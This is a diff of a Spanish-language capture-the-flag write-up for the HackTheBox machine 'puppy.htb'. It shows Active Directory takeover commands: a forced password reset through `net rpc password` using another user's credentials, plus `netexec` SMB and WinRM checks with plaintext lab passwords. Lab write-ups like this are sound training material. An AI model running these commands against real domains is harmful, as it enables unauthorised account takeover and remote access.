@@ -175,7 +175,7 @@ Viendo que podemos forzar una cambio de contraseña del usuario `ADAM`
 
 Para confirmar si hemos cambiado la contraseña, ahora vamos a ver información sobre el usuario
 `netexec smb $IP -u 'adam.silver' -p 'newP@ssword2022'` 
-Nos muestra que la cuenta esta deshabilitada
+Nos muestra que la cuenta esta deshabilitada así que no se ha efectuado el cambio
 
 Para poder habilitar la cuenta podemos hacer lo siguiente:
 Enumerar el usuario actual:
@@ -198,7 +198,19 @@ Nos indicara que ha sido modificado
 Le volvemos a asignar la nueva contraseña:
 `net rpc password "adam.silver" "newP@ssword2022" -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S $IP`
 
+Y con [[CRACKMAPEXEC-NETEXEC]] comprobamos que exista:
+`netexec smb $IP -u 'adam.silver' -p 'newP@ssword2022'`
 
+```ad-hint
+[+] PUPPY.HTB\adam.silver:newP@ssword2022
+```
 
+Para ver si el usuario pertenece al grupo de `REMOTE MANAGEMENT` usaremos 
+`netexec winrm $IP -u 'adam.silver' -p 'newP@ssword2022'`
 
+```ad-hint
+Pertence el usuario al grupo de REMOTE MANAGEMENT
+```
+
+### Prime
 
